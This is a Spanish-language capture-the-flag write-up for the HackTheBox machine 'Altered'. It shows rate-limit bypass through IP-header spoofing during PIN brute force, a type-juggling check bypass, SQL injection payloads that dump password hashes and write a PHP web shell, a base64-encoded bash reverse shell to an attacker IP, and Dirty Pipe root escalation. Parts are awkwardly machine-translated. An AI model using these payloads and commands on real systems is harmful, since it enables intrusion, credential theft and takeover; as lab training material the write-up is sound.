
# Máquina "Altered" de HackTheBox

Caracteristicas:

- Linux  
- Difícil 
- Brute Force Pin / Rate-Limit Bypass [Headers] 
- Type Juggling Bypassing SQL Injection (Error Based) SQLI to RCE -> INTO OUTFILE Query Dirty Pipe Exploit (But with PAM-Wordle configured)

Util en:

- OSCP
- eWPT 
- eWPTXv2 
- OSWE

        IP 10.10.11.159

Escaneo de puertos:

- sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.159 -oG allPorts

    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

nmap -p 22,80 -sCV 10.10.10.56 -oN target

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    | http-title: UHC March Finals
    |_Requested resource was http://10.10.11.159/login
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

codename Ubuntu 20.04 Focal

vamos a la pagina web que presenta el puerto 80 y vemos una página de inicio de sesión para el Panel del personal de UHC:

<img src="/secciones/posts/imagenes/altered/page1.webp" alt="Texto alternativo" width="500">

intentamos acceder con credenciales por defecto sin resultado.
dice que la página es para jugadores calificados para UHC, querré probar con uno de sus nombres. Hay una página con los ganadores de UHC esta temporada.
Probaré con big0us y ahora dice contraseña no válida.

En caso de inicio de sesión fallido, aparecerá el mensaje Aparece el botón "¿Olvidó su contraseña?". Al hacer clic en eso, se accede a /reset:
Si ingreso un nombre de usuario válido, dice que me envió un código PIN por correo electrónico.
Si intento visitar /index.php, devuelve una redirección a /index.php/login. si lo intento index.html, devuelve 404. Esta es una buena indicación
de que el sitio se ejecuta en PHP.

Los encabezados de respuesta muestran NGINX: 

    HTTP/1.1 302 Found
    Server: nginx/1.18.0 (Ubuntu)
    Content-Type: text/html; charset=UTF-8
    Connection: close
    Cache-Control: no-cache, private
    Date: Wed, 30 Mar 2022 13:14:29 GMT
    Location: http://10.10.11.159/login
    Set-Cookie: XSRF-TOKEN=eyJpdiI6IjEvaE5oTjdualQrcG1PcUNodTNwUFE9PSIsInZhbHVlIjoiNFJDVzRJYWRDQVlCY3g5cG43WXM5SjlwLzF6QTFra2RTRVJTOWdnTkNPVC9aL1BhQmE2UVhCUzFKb0xYaXUxcTdMVmhXRFRQNU9UbE9VdmkxOWc5Wm1wRFNhNzFhOEt4NTNoVWQrK0Y4NXpiOTloMW5Zb0hVUnZ4N05NM2lwclgiLCJtYWMiOiI5OWZmNzdjZDdhOWU1OTNjMjczMTFmMmY5NDQzY2FmZDA3YmZhMGI2MGFmODNiMGM5MmRkOGU2NmUxMTc2MDA3IiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax
    Set-Cookie: laravel_session=eyJpdiI6ImNMbzNvcitDclBuQWZSUUNFQnkzZEE9PSIsInZhbHVlIjoieVd0UUNRUlo5d1dwamRJZ3JRV1RFL0RqeHFkOVZ3MnpndE1DVVVCdS9tOHJOdDNVaGFyK1RjMTJkeGU5Ykp3WGtYRFFsT2M0S2gycEJITmYzcUxHcnFtOTZUT01tdWQ5aUQ5MlJPcGlaWWptODhxVjlxUWNoczUvVjVFOW0yd24iLCJtYWMiOiJiNjNkMWUyN2Q4N2ZjYzhkNjkxMjdjNTJlZjY2MGNjMmNkZDdiMDMxOTc1MmQ0ZmVhZGYyYWI1OTg2MGFmMzBmIiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax
    X-Frame-Options: SAMEORIGIN
    X-Content-Type-Options: nosniff
    Content-Length: 346

También laravel_sessionSe están configurando cookies, lo cual es una buena indicación de que el sitio es PHP y está construido en Laravel Framework.
Mostré un exploit de juggling tipo Laravel/PHP en el cuadro UHC anterior.
correrémos feroxbustercontra el sitio, e incluir -x php ya que sabemos que el sitio es PHP.

- feroxbuster -u http://10.10.11.159 -x php

sin obtener resultados favorables. asi que como el pin tiene solo cuatro dígitos, intentarémos hacer fuerza bruta con wfuzz. Tomaré las cookies de mi sesión
y las agregaré, tambien ocultare el codigo de salida --hh 5645.

- wfuzz -u http://10.10.11.159/api/resettoken -d "name=big0us&pin=FUZZ" -z range,0000-9999 -H "Cookie: XSRF-TOKEN=eyJpdiI6IlZ2R1BUc1JURkdYVWJMNktDeFIwZFE9PSIsInZhbHVlIjoiN3FCSkZ4OHdsZEFqRDc4eEZSbnluM2t2S2FNL1RXa2ZzV2s0OGFRYVBOSFp6clhYWnRpRUZXUTFHdSs0dE1JVm5YYm92Z2xKQUpxRzdlOUlvTU9YRDcySXdhMDZZNVYwQWlHd0hXTXByUDNTZjZMMFFobXJ6VGRvdFNVWTNmOUYiLCJtYWMiOiIxYmEwYWNmYjJhNjdiY2I2YzMzZDVmNWJiZTk2MDAxZGU4Y2U0ZDU3MGJhNGVmMThjN2FmNDllNDQwNTk3YTNkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilg0ckV2cEkzWFQwUmFLR0ZvRldPa2c9PSIsInZhbHVlIjoiWHdmOW1BVTlHTk11bEdJOGxhRVdZbjlKR25BbEo1S1ROSTNZYjFWblFuR0dnREl0WTIzRkE3WklzcUtNN2JjelQ3UytoazU5UmxoM0Zyc3ZxTW1ROS9vdzdMQXdQdVlSSUFUV0pPTTFBSmZaSS82RloxYkJUbWlCQ2lPaWJjMjUiLCJtYWMiOiJhMDJjNDkyMWVhYjc0MTI1ZTZmOTMxNTE2YTYzZWFjNjVjYzMwYzYwNTdiOTgyM2I5NjZjNmZiZWQ1OGM4OWRlIiwidGFnIjoiIn0%3D" --hh 5341,5645 -w ips  -H "X-Originating-IP: FUZ2Z"  -m zip

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000061:   429        36 L     125 W    6625 Ch     "0060"
000000063:   429        36 L     125 W    6625 Ch     "0062"
000000064:   429        36 L     125 W    6625 Ch     "0063"
000000062:   429        36 L     125 W    6625 Ch     "0061"
000000065:   429        36 L     125 W    6625 Ch     "0064"
000000066:   429        36 L     125 W    6625 Ch     "0065"

va muy lento asi que tendremos que habilitar la omision por limite de velocidad y evadir el bloqueo por bruteforce
creamos una lista con ipes 

- for i in {0..40}; do for j in {0..253}; do echo "10.10.$i.$j"; done; done > ipes

luego lanzamos:

- sudo wfuzz -c --hh=5644 -m zip -t 200 -z range,0000-9999 -w /home/kar/maquinas/altered/ipes -H "X-Forwarded-For: FUZ2Z" -d 'name=admin&pin=FUZZ' -H "Cookie: laravel_session=eyJpdiI6ImRLOHI5MGRGMkpWTVd4YUgveHY3NlE9PSIsInZhbHVlIjoid2UzVk4yQy8ybW40b0FXYTdRN3BhbWl2Zm1Uc0doZDJLcXdod3Fha0VMK0NyUkQ5alo0NWVWWnVzbjZReU9GcE5CY2ZUSVhBUlkyRmlGemNyWFNIUHJTZGdZZ0ZsVHFRY0EyNFN2UlQvV1BRc2FISHlLb2szbFozcG1DM3l0Y1MiLCJtYWMiOiIyOGFkZWJiMTU3ODI5MjM4MTlkMzVjMjUzOWRlMTQwMGE5MGRkYTkzNjlmNzJkYTdlY2VkNTdiYzEwZThlM2VkIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6InpyVlljaEM2VW5sRUhHZk5OZFgwRXc9PSIsInZhbHVlIjoiVms0clRENXNyd2tIQ3BZUnZJdHpHVGcxSThaUXFLZWxaclpvOTFMSTArVUpNMnNUdlNkbmJPSlpsMDJzamV0VDVYakY3L05acDhsOFphdzV5QUpqOXBDQlhVanNPN3ZSOVpDdnF4OXdtb3lRTi95V2toeEN6bEVmK0JSWUQzdm0iLCJtYWMiOiI5MDAyOTZhYjkzNDBkM2RiMzU3NThlZjk2Y2M4YjA0NjUzOGM3ZjYyNzI2M2RhM2U4N2ZjNzhiYzlhOTVmYmEzIiwidGFnIjoiIn0%3D"   http://10.10.11.159/api/resettoken

un minuto después tenemos devuelta una longitud diferente.
Cuando ingreso ese pin en /reset, muestra una nueva forma: 

<img src="/secciones/posts/imagenes/altered/changepass1.webp" alt="Texto alternativo" width="500">

cambiamos la clave iniciamos sesion y una vez que haya iniciado sesión, encontrará una tabla sencilla con una lista de ganadores, su nombre, país y un enlace a un perfil.

<img src="/secciones/posts/imagenes/altered/perfil1.webp" alt="Texto alternativo" width="500">

Al pasar el cursor sobre cada enlace, solo se muestra que apunta a la página #. Al hacer clic en uno, aparece una nueva sección con algo de texto: 
Mirando las herramientas de desarrollo de Firefox, hay Javascript que maneja la acción "al hacer clic", cada una <a> 
La etiqueta está codificada con un onclickque maneja el clic con JavaScript. Por ejemplo: 

<a href="#" id="GetBio" onclick="getBio( '1', '89cb389c73f667c5511ce169033089cb' );">View</a>

Cada enlace está codificado con un segundo parámetro diferente.

El getBio El script está en línea en la página en la parte superior: 

function getBio(id,secret) {
        $.ajax({
            type: "GET",
            url: 'api/getprofile',
            data: {
                id: id,
                secret: secret
            },
            success: function(data)
            {
                document.getElementById('alert').style.visibility = 'visible';
                document.getElementById('alert').innerHTML = data;
            }

        });
    }

Realizamos una solicitud HTTP a través de AJAX para /api/getprofilepasando la identificación y el secreto.
Mirando en Burp se confirma que cada enlace envía una identificación y un secreto diferentes al servidor: 
El secretparece ser el mismo para un determinado id. El secreto parece un hash MD5, pero algunas pruebas rápidas en una consola muestran
que no es solo un hash de la identificación. Lo más probable es que estén agregando o anteponiendo un valor secreto a la identificación y aplicando hash. 

Si envíamos una de las solicitudes a Burp Repeater e intento modificar el secreto, devuelve un mensaje de error:

<img src="/secciones/posts/imagenes/altered/burp1.png" alt="Texto alternativo" width="500">

Intentaré enviar datos JSON en el cuerpo de una solicitud GET. Con el secreto legítimo, la respuesta vuelve: 

<img src="/secciones/posts/imagenes/altered/burp2.png" alt="Texto alternativo" width="500">

Si pienso en el código en el servidor, espero que tome la identificación, anteponga o agregue algunos datos adicionales, tome un hash 
y luego compare ese hash con secret. Si esa comparación se hace con ==y no ===, los malabarismos de tipos pasarían por alto el control. 
intentaré cambiar secret a true, y funciona:

<img src="/secciones/posts/imagenes/altered/burp3.png" alt="Texto alternativo" width="500">

Esta consulta también funciona con el id 1 como una cadena en lugar de un int: 
Esto es importante porque si envío algo como una carga útil de inyección SQL, no puede ir en un campo entero, pero encaja bien en una cadena

Para probar la inyección SQL, comenzaré con un simple "1'"y falla: 

<img src="/secciones/posts/imagenes/altered/burp4.png" alt="Texto alternativo" width="500">

pero nos aclara que estamos realizando inyeccion sql ahora si envío "12"como carga útil, también devuelve 500. Presumiblemente eso se debe
a que no hay id en la base de datos, y el sitio no se está manejando tan bien (suponiendo, dado que nadie tiene la secret para 12 no se puede solicitar).
Si cambio eso a "12 or 1=1;-- -", entonces funciona de nuevo: 
Lo que esto me dice es que la consulta probablemente se vea así: 

    SELECT profile from users where id = [input];

sqlmapno parece funcionar con una solicitud GET con parámetros en el cuerpo. Aún así, no es difícil hacerlo manualmente. Comenzaré por tener una idea
de cuántas columnas hay y cuáles se muestran agregando union select 1, entonces union select 1,2, entonces union select 1,2,3, etc. 
Solo cuando agregué selectLa declaración tiene el mismo número de columnas que devolverá la consulta en la que se inyecta. Parece que hay tres columnas: 

<img src="/secciones/posts/imagenes/altered/burp5.png" alt="Texto alternativo" width="500">

puedo reemplazar 3 con cosas que quiero consultar. Comenzaré obteniendo una lista de las bases de datos:

<img src="/secciones/posts/imagenes/altered/burp6.png" alt="Texto alternativo" width="500">

sólo uhces personalizado. Enumeraré las tablas y columnas con:

    {"id":"0 union select 1,2,group_concat(concat('\n', table_name, ':', column_name)) from information_schema.columns where table_schema = 'uhc';-- -", "secret":true}

devuelve:

    failed_jobs:id,
    failed_jobs:uuid,
    failed_jobs:connection,
    failed_jobs:queue,
    failed_jobs:payload,
    failed_jobs:exception,
    failed_jobs:failed_at,
    migrations:id,
    migrations:migration,
    migrations:batch,
    password_resets:email,
    password_resets:token,
    password_resets:created_at,
    personal_access_tokens:id,
    personal_access_tokens:tokenable_type,
    personal_access_tokens:tokenable_id,
    personal_access_tokens:name,
    personal_access_tokens:token,
    personal_access_tokens:abilities,
    personal_access_tokens:last_used_at,
    personal_access_tokens:created_at,
    personal_access_tokens:updated_at,
    tasks:id,
    tasks:title,
    tasks:description,
    tasks:progress,
    tasks:status,
    tasks:owner,
    tasks:created_at,
    tasks:updated_at,
    users:id,
    users:name,
    users:email,
    users:country,
    users:bio,
    users:email_verified_at,
    users:password,
    users:remember_token,
    users:created_at,
    users:updated_at

extraemos usuario y contraseñas con:

    {"id":"0 union select 1,2,group_concat(concat('\n', name, ':', password)) from users;-- -", "secret":true}

big0us:$2y$10$Cuf2DxXbrTQSKYWL6n3Kbeqq6TaZ3KCgISO8FdGpsNZ5aEa6lSx6G,

celesian:$2y$10$8ewqN3lE9iazbo8sFiwUleeNIbOpAMRcaMzeiXJ50wlItN2Kd5pI6,

luska:$2y$10$KdZCbzxXRsBOBHI.91XIz.O.lQQ3TqeY8uonzAumoAv6v9JVQv3g.,

tinyb0y:$2y$10$X501zxcWLKXf.OteOaPILuhMBIalFjid5bBjBkrst/cynKL/DLfiS,

o-tafe:$2y$10$XIrsc.ma/p0qhvWm9.sqyOnA5184ICWNverXQVLQJD30nCw7.PyxW,

watchdog:$2y$10$RTbD7i5I53rofpAfr83YcOK2XsTglO01jVHZajEOSH1tGXiU8nzEq,

mydonut:$2y$10$7DFlqs/eXGm0JPVebpPheuEx3gXPhTnRmN1Ia5wutECZg1El7cVJK,

bee:$2y$10$Furn1Q0Oy8IbeCslv7.Oy.psgPoCH2ds3FZfJeQlCdxJ0WVhLKmzm

y tenemos usuarios y contraseñas hasheadas, sin embargo no es util

Otra cosa que puedo hacer con una inyección SQL es intentar leer archivos. Para asegurarme de tener la sintaxis correcta, 
comenzaré con /etc/passwd usando load_file: 

<img src="/secciones/posts/imagenes/altered/salida1.png" alt="Texto alternativo" width="500">

Para comprobar dónde está alojado el sitio web, buscaré un archivo de configuración para NGINX. La ubicación de estos es en /etc/nginx/sites-enabled/.
buscaré un archivo de configuración para NGINX. La ubicación de estos es en /etc/nginx/sites-enabled/

<img src="/secciones/posts/imagenes/altered/salida2.png" alt="Texto alternativo" width="500">

podemos ver una configuracion estándar. Tomaré nota de la ubicación que he marcado en azul. La raíz web está en /srv/altered/public
podemos leer la fuente, como index.php: 

<img src="/secciones/posts/imagenes/altered/php1.png" alt="Texto alternativo" width="500">

como puedo leer, también puedo intentar escribir un archivo. El envío de esta carga útil generará un error 500 del servidor: 

    {"id":"0 union select 1,2,'test' into outfile '/srv/altered/public/test1';-- -", "secret":true}

- curl http://10.10.11.159/test

    1       2       test

También puedo escribir archivos PHP que serán ejecutados. Por ejemplo, enviando: 

    {"id":"0 union select 1,2,'<?php phpinfo(); ?>' into outfile '/srv/altered/public/info.php';-- -", "secret":true}

Esa es la salida del phpinfo()¡ asi que funciona 
Para obtener un shell, escribiré un script PHP simple que crea un shell inverso. Para evitar comillas anidadas, crearé un shell inverso y lo codificaré en base64

- echo "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" | base64 

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxJwo=

    {"id":"0 union select 1,2,'<?php system(base64_decode(\"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxJwo=\")); ?>' into outfile '/srv/altered/public/shell.php';-- -", "secret":true}

vamos a 10.10.14.6/shell.php pero antes podemos nc en modo escucha y tenemos shell, procedemos a tratarla

- script /dev/null -c bash

- ctrl + z

- stty raw -echo; fg

- reset xterm

## Escalamiento de privilegios.

enumeramos cositas y uname -a muestra que el kernel es

Linux altered 5.16.0-051600-generic #202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

buscamos y tenemos un CVE-2022-0847 o Dirty Pipe  que se parchó para los kernels 5.16.11, 5.15.25 y 5.10.102. Este cuadro ejecuta 5.16.0 y,
por lo tanto, debería ser vulnerable.

Dirty Pipe (CVE-2022-0847) se hizo público a principios de marzo de 2022, con una publicación de blog detallada de Max Kellermann. 
La publicación tiene grandes detalles sobre cómo funciona. 
https://dirtypipe.cm4all.com/

El exploit aprovecha cómo el sistema almacenará en caché los datos antes de escribirlos en el disco, modificando los datos en ese caché para que 
los cambios se escriban en el disco. Esto permite que un atacante modifique archivos incluso sin permisos de escritura con algunas restricciones:

    Deben tener acceso de lectura al archivo.
    No pueden modificar el primer byte del archivo.
    No pueden cambiar el tamaño del archivo.

Dentro de estas limitaciones, la forma más común de explotar esto es modificar el archivo /etc/passwd   (algo que he mostrado muchas veces antes ). 
La diferencia es que normalmente agrego un segundo usuario root con un hash conocido. En este caso, el exploit normalmente simplemente 
hará una copia de seguridad del archivo, editará al usuario raíz, obtendrá un shell como ese usuario y luego devolverá el archivo original.

La otra forma menos común de explotar esto es sobrescribir un binario SUID con un nuevo ELF que obtenga un shell.

Hay otras formas de abusar de la escritura arbitraria que realmente no funcionan en este caso. podría escribirle a /etc/crontab(u otro cronarchivos), 
pero debido a cómo funciona el ataque, el sistema de archivos no notificará cronpara recargarlos. Si los cambios duran mediante un reinicio
u otro cronModificación, podrían funcionar. Otra técnica común con escritura arbitraria es cambiar el sudoersarchivo, lo que permite al usuario actual 
ejecutar comandos como root. Eto no funcionará aquí porque normalmente un usuario que no sea root no puede leer ese archivo. 

intentaremos con 

https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

hay dos exploits de prueba de concepto de Dirty Pipe. El primero hace lo que hacen la mayoría de los exploits de Dirty Pipe: modificar /etc/password. 
gcc y cc no están en Altered, así que descargaré el código fuente y lo compilaré 

- wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c

- gcc -o exploit-1 exploit-1.c

lanzaremos desde el aacante un servidor simple en python y buscaré el exploit desde Altered: 

    www-data@altered:/dev/shm$ wget 10.10.14.6/exploit-1
    www-data@altered:/dev/shm$ chmod +x exploit-1

obenemos 

            www-data@altered:/dev/shm$ ./exploit-1 
            Backing up /etc/passwd to /tmp/passwd.bak ...
            Setting root password to "piped"...
            --- Welcome to PAM-Wordle! ---

            A five character [a-z] word has been selected.
            You have 6 attempts to guess the word.

            After each guess you will receive a hint which indicates:
            ? - what letters are wrong.
            * - what letters are in the wrong spot.
            [a-z] - what letters are correct.

            --- Attempt 1 of 6 ---
            Word: Invalid guess: unknown word.
            Word:


El exploit cambió la contraseña a "piped" y luego intenta ejecutarse su: 

    char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                    "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                    "cp /tmp/passwd.bak /etc/passwd;"
                    "echo \\\"Done! Popping shell... (run commands now)\\\";"
                    "/bin/sh;"
                "\" root"};
            execv("/bin/sh", argv);

Si presiono Ctrl-c desde esto y simplemente ejecuto su, Veo lo mismo: 

    www-data@altered:/dev/shm$ su -
    --- Welcome to PAM-Wordle! ---

    A five character [a-z] word has been selected.
    You have 6 attempts to guess the word.

    After each guess you will receive a hint which indicates:
    ? - what letters are wrong.
    * - what letters are in the wrong spot.
    [a-z] - what letters are correct.

    --- Attempt 1 of 6 ---
    Word:

probablemente tenga PAM-Wordle instalado. PAM significa Módulo de autenticación conectable. Parece que esto se agregó en este cuadro.
Wordle es un juego de palabras que ahora es muy popular en Internet. Este tipo de cosas no son muy realistas.

inenamos inroduciendo

    Word: hacks
    Hint->???*?

seguimos itentando:

    --- Attempt 1 of 6 ---
    Word: hacks
    Hint->???*?
    --- Attempt 2 of 6 ---
    Word: shell
    Hint->?????
    --- Attempt 3 of 6 ---
    Word: mkdir
    Hint->?*??*
    --- Attempt 4 of 6 ---
    Word: ngrok 
    Correct!
    Password:

Ingresaré la contraseña del exploit, "canalizada", y obtendré un shell raíz: 

    --- Attempt 4 of 6 ---
    Word: ngrok 
    Correct!
    Password:
    # bash
    root@altered:~#

buscamos la flag de root y terminada.



Algunos de los writeups en esta página, pueden tener contenido de otras páginas o tener muy pocas imágenes, esto 
debido a que en algunas de las máquinas que realice, no tome los apuntes o no tome capturas de pantalla, así que he decidido buscar varios writeups
y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí, también si encuentra faltas de ortografía 
o cualquier error, Puedes contactarme a mi correo.